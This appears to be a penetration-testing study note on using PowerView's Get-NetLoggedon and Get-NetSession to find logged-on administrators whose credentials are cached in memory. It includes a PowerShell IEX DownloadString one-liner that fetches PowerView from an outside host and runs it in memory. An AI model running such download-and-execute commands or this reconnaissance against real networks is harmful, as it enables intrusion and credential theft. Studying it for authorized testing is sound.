# Logged on Users

At this points we have a list of all users and groups and can locate Administrative users. In this step we want to find logged-in users with Administrative rights since their credentials will be cached in memory.

Thanks to the following script we can enumerate logged on users.

```bash
/usr/share/windows-resources/powersploit/Recon/PowerView.ps1
```

Inside this script there are two main functions we can use for logged users enumeration:

* **Get-NetLoggedon:** Returns the list of all users logged on to a target workstation (requieres administrative permissions).

* **Get-NetSession:** Returns active user sessions on servers such as fileservers or DCs.

## Usage:

**Step 1:** Import PowerView module:

```bash
#Two ways to do it:
#1, easiest to use:
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.139:8000/PowerView.ps1')

#2 (if PowerView is already in the machine):
Import-Module .\PowerView.ps1
```

**Step 2:** Launch any module against the target workstation or server:

```bash
Get-NetLoggedon -ComputerName $COMPUTERNAME

#The following one should be DC name or a server:
Get-NetSession -ComputerName $COMPUTERNAME
```
